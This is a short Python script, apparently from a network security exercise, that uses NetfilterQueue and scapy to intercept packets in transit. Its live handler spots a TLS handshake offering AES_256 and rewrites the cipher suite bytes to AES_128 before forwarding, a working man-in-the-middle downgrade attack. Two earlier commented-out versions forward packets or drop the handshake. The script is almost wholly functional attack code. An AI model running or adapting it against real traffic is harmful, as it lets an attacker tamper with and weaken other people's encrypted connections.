#!/usr/bin/python3
from netfilterqueue import NetfilterQueue
from scapy.all import *

nfQueueID         = 0
maxPacketsToStore = 100

# 1st version of function that simply forwards the received packets using pkt.accept()
#def packetReceived(pkt):             # called each time a packet is put in the queue
#  print("New packet received.")
#  pkt.accept();                      # accepts and forwards this packet to the appropriate network address


# 2nd version of function that drops the packet corresponding to AES_256, leaving the one with AES_128 untouched.
#def packetReceived(pkt):
#  print("Accepted a new packet...")
#  ip = IP(pkt.get_payload())
#  if not ip.haslayer("Raw"):                               # not the Handshake, forward
#    pkt.accept();
#  else:
#    tcpPayload = ip["Raw"].load;                           # "Raw" corresponds to the TCP payload
#
#    if tcpPayload[0] == 0x16 and tcpPayload[1] == 0x03 and tcpPayload[46] == 0x00 and tcpPayload[47] == 0x35:
#      pkt.drop();                                          # drop TLS_RSA_WITH_AES_256_CBC_SHA
#    else:
#      pkt.accept();                                        # not the Handshake, forward

# 3rd version of function that changes the available cipher suite from AES_256 into AES_128 on the fly, by changing 0x00 0x35 to 0x00 0x2F
def packetReceived(pkt):
  print("Accepted a new packet...")
  ip = IP(pkt.get_payload())
  if not ip.haslayer("Raw"):
    pkt.accept();
  else:
    tcpPayload = ip["Raw"].load;
    if tcpPayload[0] == 0x16 and tcpPayload[1] == 0x03 and tcpPayload[46] == 0x00 and tcpPayload[47] == 0x35:
      # we located the Handshake
      msgBytes = pkt.get_payload()       # msgBytes is read-only, copy it
      msgBytes2 = [b for b in msgBytes]
      msgBytes2[112] = 0x00
      msgBytes2[113] = 0x2F
      pkt.set_payload(bytes(msgBytes2))
      pkt.accept()

    else:
      pkt.accept();

print("Binding to NFQUEUE", nfQueueID)
nfqueue = NetfilterQueue()
nfqueue.bind(nfQueueID, packetReceived, maxPacketsToStore) # binds to queue 0, use handler "packetReceived()"
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('Listener killed.')

nfqueue.unbind()